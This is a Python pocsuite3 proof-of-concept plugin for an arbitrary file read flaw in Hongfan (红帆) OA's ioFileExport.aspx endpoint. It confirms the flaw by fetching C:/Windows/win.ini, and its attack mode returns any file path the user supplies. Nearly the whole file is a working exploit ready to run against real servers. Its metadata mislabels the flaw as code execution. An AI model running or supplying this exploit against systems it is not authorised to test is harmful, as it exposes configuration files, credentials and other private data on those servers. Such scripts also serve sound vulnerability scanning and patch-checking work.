from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict,OptString
from pocsuite3.api import get_listener_ip, get_listener_port,REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '红帆OA ioFileExport.aspx任意文件读取'
    appName = '红帆 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''None'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('',require=False)
        return o

    def _verify(self, verify=True):
        result = {}
        vul_url = self.url+"/iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini"
        resp = requests.get(vul_url,verify=False,timeout=10)
        if resp.status_code == 200 and "[extensions]" in resp.text and "[fonts]" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Content'] = resp.text
        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/iOffice/prg/set/ioCom/ioFileExport.aspx?url="
        cmd = self.get_option("command")
        vul_url = self.url+path+cmd
        print(vul_url)
        try:
            resp = requests.get(vul_url,verify=False,timeout=10)
            if resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = resp.text
        except Exception as e:
            return
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
